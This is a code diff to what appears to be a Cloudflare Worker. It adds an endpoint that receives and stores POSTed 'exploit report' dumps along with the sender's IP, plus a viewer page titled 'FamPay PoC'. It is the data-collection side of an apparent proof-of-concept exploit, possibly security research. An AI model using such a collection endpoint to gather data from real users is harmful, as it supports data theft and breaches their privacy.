@@ -26,6 +26,7 @@
 // In-memory store — resets on worker restart/cold start.
 // For persistence add a Workers KV binding in wrangler.jsonc.
 const logs = [];
+let lastDump = null; // stores the latest full exploit report dump
 
 const CORS = {
   'Access-Control-Allow-Origin': '*',
@@ -138,6 +139,68 @@ export default {
   </thead>
   <tbody>${rows}</tbody>
 </table>
+</body></html>`);
+    }
+
+    // /dump — receives full exploit report via POST
+    if (path === '/dump') {
+      if (request.method === 'POST') {
+        const body = await request.text();
+        lastDump = {
+          text: body,
+          timestamp: new Date().toISOString(),
+          ip: request.headers.get('cf-connecting-ip') || 'unknown',
+        };
+        return json({ ok: true });
+      }
+      return json({ error: 'POST only' }, 405);
+    }
+
+    // /dump-viewer — shows the last full dump
+    if (path === '/dump-viewer') {
+      const content = lastDump
+        ? `<pre style="white-space:pre-wrap;word-break:break-all;color:#00e676;font-size:12px;line-height:1.6">${escHtml(lastDump.text)}</pre>`
+        : '<p style="color:#555;text-align:center;padding:40px">No dump yet — run the exploit page first.</p>';
+      return html(`<!DOCTYPE html>
+<html lang="en"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Dump Viewer — FamPay PoC</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:#0a0a0f;color:#e0e0e0;font-family:monospace;padding:20px;font-size:12px}
+  h2{color:#00e676;margin-bottom:4px;font-size:16px}
+  .meta{color:#666;font-size:11px;margin-bottom:16px}
+  .meta a{color:#448aff;margin-right:12px}
+  .copy-btn{background:#00e676;color:#000;border:none;padding:8px 16px;border-radius:6px;font-weight:700;font-size:12px;cursor:pointer;margin-bottom:16px}
+  #content{background:#0d0d14;border:1px solid #2a2a3a;border-radius:6px;padding:16px}
+</style></head>
+<body>
+<h2>&#128203; Full Exploit Dump</h2>
+<div class="meta">
+  ${lastDump ? `Captured: ${lastDump.timestamp} &nbsp;·&nbsp; From: ${lastDump.ip}` : 'No data yet'}
+  &nbsp;·&nbsp; <a href="/log-viewer">&#128225; Log Viewer</a>
+  <a href="/">&#8592; All Chains</a>
+</div>
+${lastDump ? `<button class="copy-btn" onclick="copyAll()">&#128203; Copy All to Clipboard</button>` : ''}
+<div id="content">${content}</div>
+<script>
+function copyAll() {
+  const text = document.getElementById('content').innerText;
+  if (navigator.clipboard) {
+    navigator.clipboard.writeText(text).then(() => {
+      document.querySelector('.copy-btn').innerText = '✓ Copied!';
+    });
+  } else {
+    const ta = document.createElement('textarea');
+    ta.value = text;
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+  }
+}
+<\/script>
 </body></html>`);
     }
 
